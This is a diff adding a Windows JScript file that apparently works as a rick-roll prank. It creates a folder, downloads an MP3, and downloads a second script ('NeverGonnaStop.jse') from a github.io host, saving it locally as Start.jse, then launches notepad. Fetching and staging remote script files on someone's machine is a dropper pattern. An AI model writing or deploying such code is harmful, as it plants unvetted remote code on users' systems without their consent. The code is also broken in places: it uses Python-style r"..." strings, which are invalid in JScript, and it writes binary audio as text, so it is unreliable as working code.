@@ -1,0 +1,76 @@
+var fso = new ActiveXObject("Scripting.FileSystemObject");
+
+var folderPath = "NeverGonnaGiveYouUp"; // Replace with the desired folder path
+
+try {
+    // Create the folder
+    fso.CreateFolder(folderPath);
+
+    WScript.Echo("Made 1/3");
+} catch (error) {
+    WScript.Echo("Error: " + error.description);
+}
+var http = new ActiveXObject("MSXML2.ServerXMLHTTP");
+var fso = new ActiveXObject("Scripting.FileSystemObject");
+
+var url = "https://ellinet13.github.io/music%20rick%20roll.mp3"; // Replace with the URL of the file you want to download
+var outputPath = r"NeverGonnaGiveYouUp\song.mp3"; // Replace with the desired local file path
+
+try {
+    // Make an HTTP GET request to download the file
+    http.open("GET", url, false);
+    http.send();
+
+    // Check if the request was successful
+    if (http.status === 200) {
+        // Save the downloaded content to a local file
+        var outputFile = fso.CreateTextFile(outputPath, true);
+        outputFile.Write(http.responseText);
+        outputFile.Close();
+
+        WScript.Echo("Downloaded 2/3");
+    } else {
+        WScript.Echo("Error downloading file. Status: " + http.status);
+    }
+} catch (error) {
+    WScript.Echo("Error: " + error.description);
+}
+var http = new ActiveXObject("MSXML2.ServerXMLHTTP");
+var fso = new ActiveXObject("Scripting.FileSystemObject");
+
+var url = "https://ellinet13.github.io/NeverGonnaStop.jse"; // Replace with the URL of the file you want to download
+var outputPath = r"NeverGonnaGiveYouUp/Start.jse"; // Replace with the desired local file path
+
+try {
+    // Make an HTTP GET request to download the file
+    http.open("GET", url, false);
+    http.send();
+
+    // Check if the request was successful
+    if (http.status === 200) {
+        // Save the downloaded content to a local file
+        var outputFile = fso.CreateTextFile(outputPath, true);
+        outputFile.Write(http.responseText);
+        outputFile.Close();
+
+        WScript.Echo("Downloaded 3/3");
+    } else {
+        WScript.Echo("Error downloading file. Status: " + http.status);
+    }
+} catch (error) {
+    WScript.Echo("Error: " + error.description);
+}
+
+var WshShell = new ActiveXObject("WScript.Shell");
+
+try {
+    // Replace "notepad.exe" with the path to the application or file you want to open
+    WshShell.Run("notepad.exe");
+
+    // Add a delay to give the application some time to open (optional)
+    WScript.Sleep(2000); // Wait for 2 seconds
+
+    WScript.Echo("Opened start file");
+} catch (error) {
+    WScript.Echo("Error: " + error.description);
+}
